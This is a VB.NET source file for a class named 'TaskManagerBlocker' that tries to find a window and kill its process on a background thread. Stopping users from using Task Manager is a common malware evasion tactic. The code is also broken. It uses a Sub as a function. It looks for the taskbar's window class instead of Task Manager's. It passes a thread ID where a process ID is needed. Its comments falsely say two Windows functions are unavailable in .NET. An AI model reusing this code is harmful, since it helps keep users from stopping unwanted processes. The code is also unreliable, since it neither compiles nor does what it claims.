Imports System.Runtime.InteropServices
Imports System.Runtime.InteropServices
Imports System.Threading

Public Class TaskManagerBlocker
Private Declare Auto Function OpenProcess Lib "kernel32.dll" (ByVal dwDesiredAccess As UInteger, ByVal bInheritHandle As Boolean, ByVal dwProcessId As UInteger) As IntPtr
Private Declare Auto Function TerminateProcess Lib "kernel32.dll" (ByVal hProcess As IntPtr, ByVal uExitCode As UInteger) As Boolean
Private Declare Auto Function GetCurrentProcessId Lib "kernel32.dll" () As UInteger
Private Declare Auto Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hWnd As IntPtr, ByRef lpdwProcessId As UInteger) As UInteger

Private Const PROCESS_TERMINATE As UInteger = &H1
Private Const PROCESS_QUERY_INFORMATION As UInteger = &H400

Private Sub BlockTaskManager()
Dim currentProcessId As UInteger = GetCurrentProcessId()
Dim taskManagerProcessId As UInteger

' Get the process ID of the Task Manager
Dim taskManagerHandle As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
If taskManagerHandle <> IntPtr.Zero Then
taskManagerProcessId = GetWindowThreadProcessId(taskManagerHandle, 0)
End If

' Open a handle to the Task Manager process with terminate permission
Dim taskManagerProcessHandle As IntPtr = OpenProcess(PROCESS_TERMINATE, False, taskManagerProcessId)

' If the handle is valid, terminate the Task Manager process
If taskManagerProcessHandle <> IntPtr.Zero Then
TerminateProcess(taskManagerProcessHandle, 0)
CloseHandle(taskManagerProcessHandle)
End If
End Sub

Private Sub CloseHandle(ByVal hObject As IntPtr)
' Close the handle to the process
' This is a placeholder for the actual CloseHandle function, which is not available in .NET
End Sub

Private Sub FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String)
' Find the window with the given class name and window name
' This is a placeholder for the actual FindWindow function, which is not available in .NET
End Sub

Public Sub Start()
' Start the task manager blocking service in a separate thread
Dim thread As New Threading.Thread(AddressOf BlockTaskManager)
thread.Start()
End Sub
End Class
